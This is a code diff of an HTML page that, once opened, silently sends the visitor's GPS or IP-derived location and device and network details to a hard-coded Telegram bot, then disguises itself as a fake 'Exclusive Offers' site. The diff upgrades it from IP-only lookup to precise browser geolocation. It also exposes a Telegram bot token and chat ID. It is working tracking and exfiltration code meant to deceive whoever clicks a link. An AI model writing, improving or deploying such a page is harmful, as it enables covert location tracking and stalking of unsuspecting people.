@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Send Location to Telegram Bot</title>
-    <!-- Include ua-parser-js for better user agent parsing -->
     <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/dist/ua-parser.min.js"></script>
 </head>
 <body>
@@ -12,38 +11,25 @@
     <p>Your location will be sent to my Telegram bot automatically.</p>
 
     <script>
-        // Replace these with your actual Telegram Bot Token and Chat ID
-        const BOT_TOKEN = '7877643092:AAFhTdsbJYQu5G662xrCBHsWxOw6pjJFdPw'; // e.g., '123456789:ABCDEF...'
-        const CHAT_ID = '7492622739';   // e.g., '123456789' (your Telegram user ID)
+        const BOT_TOKEN = '7877643092:AAFhTdsbJYQu5G662xrCBHsWxOw6pjJFdPw';
+        const CHAT_ID = '7492622739';
 
-        // Function to send location and user info to Telegram Bot
+        // Send data to Telegram
         function sendDataToTelegram(latitude, longitude, userInfo) {
             const locationUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${latitude}&longitude=${longitude}`;
             fetch(locationUrl, { method: 'GET' })
                 .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        console.log('Location sent successfully!');
-                    } else {
-                        console.error('Error sending location:', data);
-                    }
-                })
+                .then(data => console.log(data.ok ? 'Location sent!' : 'Error:', data))
                 .catch(error => console.error('Fetch error:', error));
 
             const messageUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(userInfo)}`;
             fetch(messageUrl, { method: 'GET' })
                 .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        console.log('User info sent successfully!');
-                    } else {
-                        console.error('Error sending user info:', data);
-                    }
-                })
+                .then(data => console.log(data.ok ? 'User info sent!' : 'Error:', data))
                 .catch(error => console.error('Fetch error:', error));
         }
 
-        // Function to get system information (improved with ua-parser-js)
+        // System info using ua-parser-js
         function getSystemInfo() {
             const parser = new UAParser();
             const result = parser.getResult();
@@ -51,29 +37,23 @@
             const platform = navigator.platform || "Unknown";
             const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unknown";
             const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
-
             return `
 📱 System Information:
 • OS: ${os}
-• Version: Not available in browser
-• Machine: ${platform}
+• Platform: ${platform}
 • CPU: ${cpuCores}
-• RAM: Total ${memory} | Used: Not available in browser
-• Disk: Not available in browser
-• Processes: Not available in browser
+• RAM: Total ${memory}
             `;
         }
 
-        // Function to get user information (approximated)
         function getUserInfo() {
             return `
 👤 User Information:
-• User: Not available in browser
-• Hostname: Not available in browser
+• User: Not available
+• Hostname: Not available
             `;
         }
 
-        // Function to get network information
         function getNetworkInfo(data) {
             return `
 🌍 Network Information:
@@ -83,46 +63,33 @@
 • City: ${data.city || "Unknown"}
 • ISP: ${data.isp || "Unknown"}
 • Timezone: ${data.timezone || "Unknown"}
-• ASN: ${data.as || "Unknown"}
             `;
         }
 
-        // Function to get SIM information (placeholder)
         function getSimInfo() {
             return `
 📞 SIM Information:
-• Carrier: Not available in browser
-• Phone Number: Not available in browser
-• SIM Serial: Not available in browser
+• Carrier: Not available
+• Phone Number: Not available
             `;
         }
 
-        // Function to get system load (approximated)
         function getSystemLoad() {
-            const memoryUsage = navigator.deviceMemory ? "Estimated based on device memory" : "Not available in browser";
+            const memoryUsage = navigator.deviceMemory ? "Estimated" : "Not available";
             return `
 📊 System Load:
-• CPU Usage: Not available in browser
 • Memory Usage: ${memoryUsage}
-• Swap Usage: Not available in browser
             `;
         }
 
-        // Function to get current time (standardized format)
         function getCurrentTime() {
             const now = new Date();
-            const year = now.getFullYear();
-            const month = String(now.getMonth() + 1).padStart(2, '0');
-            const day = String(now.getDate()).padStart(2, '0');
-            const hours = String(now.getHours()).padStart(2, '0');
-            const minutes = String(now.getMinutes()).padStart(2, '0');
-            const seconds = String(now.getSeconds()).padStart(2, '0');
             return `
-⏰ Time: ${year}-${month}-${day} ${hours}:${minutes}:${seconds}
+⏰ Time: ${now.toISOString().replace('T', ' ').slice(0, 19)}
             `;
         }
 
-        // Function to get location via IP and collect user info
+        // Get location using Geolocation API with IP fallback
         function getLocationAndUserInfo() {
             const systemInfo = getSystemInfo();
             const userInfo = getUserInfo();
@@ -130,35 +97,64 @@
             const systemLoad = getSystemLoad();
             const currentTime = getCurrentTime();
 
-            fetch('http://ip-api.com/json/')
-                .then(response => response.json())
-                .then(data => {
-                    const latitude = data.lat;
-                    const longitude = data.lon;
-                    const country = data.country;
-                    const city = data.city;
-
-                    const networkInfo = getNetworkInfo(data);
-
-                    const combinedInfo = `
-${systemInfo}
-${userInfo}
-${networkInfo}
-${simInfo}
-${systemLoad}
-${currentTime}
-                    `;
-
-                    sendDataToTelegram(latitude, longitude, combinedInfo);
-                    makeSiteFake(country, city);
-                })
-                .catch(error => {
-                    console.error('Error fetching IP location:', error);
-                    document.body.innerHTML += '<p>Failed to detect location. Enjoy anyway!</p>';
-                });
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        fetch('http://ip-api.com/json/')
+                            .then(response => response.json())
+                            .then(data => {
+                                const networkInfo = getNetworkInfo(data);
+                                const combinedInfo = `${systemInfo}${userInfo}${networkInfo}${simInfo}${systemLoad}${currentTime}`;
+                                sendDataToTelegram(latitude, longitude, combinedInfo);
+                                makeSiteFake(data.country, data.city);
+                            })
+                            .catch(error => {
+                                console.error('IP API error:', error);
+                                const combinedInfo = `${systemInfo}${userInfo}${simInfo}${systemLoad}${currentTime}`;
+                                sendDataToTelegram(latitude, longitude, combinedInfo);
+                            });
+                    },
+                    (error) => {
+                        console.warn('Geolocation error:', error.message);
+                        // Fallback to IP-based location
+                        fetch('http://ip-api.com/json/')
+                            .then(response => response.json())
+                            .then(data => {
+                                const latitude = data.lat || 0;
+                                const longitude = data.lon || 0;
+                                const networkInfo = getNetworkInfo(data);
+                                const combinedInfo = `${systemInfo}${userInfo}${networkInfo}${simInfo}${systemLoad}${currentTime}`;
+                                sendDataToTelegram(latitude, longitude, combinedInfo);
+                                makeSiteFake(data.country, data.city);
+                            })
+                            .catch(error => {
+                                console.error('IP fallback failed:', error);
+                                document.body.innerHTML += '<p>Location detection failed. Enjoy anyway!</p>';
+                            });
+                    },
+                    { timeout: 10000, maximumAge: 60000 } // Options: 10s timeout, 1min cache
+                );
+            } else {
+                console.error('Geolocation not supported');
+                // Fallback to IP-based location
+                fetch('http://ip-api.com/json/')
+                    .then(response => response.json())
+                    .then(data => {
+                        const latitude = data.lat || 0;
+                        const longitude = data.lon || 0;
+                        const networkInfo = getNetworkInfo(data);
+                        const combinedInfo = `${systemInfo}${userInfo}${networkInfo}${simInfo}${systemLoad}${currentTime}`;
+                        sendDataToTelegram(latitude, longitude, combinedInfo);
+                        makeSiteFake(data.country, data.city);
+                    })
+                    .catch(error => {
+                        console.error('IP fallback failed:', error);
+                        document.body.innerHTML += '<p>Location detection failed. Enjoy anyway!</p>';
+                    });
+            }
         }
 
-        // Function to make the site appear "more fake"
         function makeSiteFake(country, city) {
             document.title = `${city} Exclusive Offers!`;
             document.body.style.backgroundColor = "#ffe6e6";
@@ -169,10 +165,7 @@ ${currentTime}
             `;
         }
 
-        // Automatically trigger IP-based location and user info detection when the page loads
-        window.onload = function() {
-            getLocationAndUserInfo();
-        };
+        window.onload = getLocationAndUserInfo;
     </script>
 </body>
 </html>
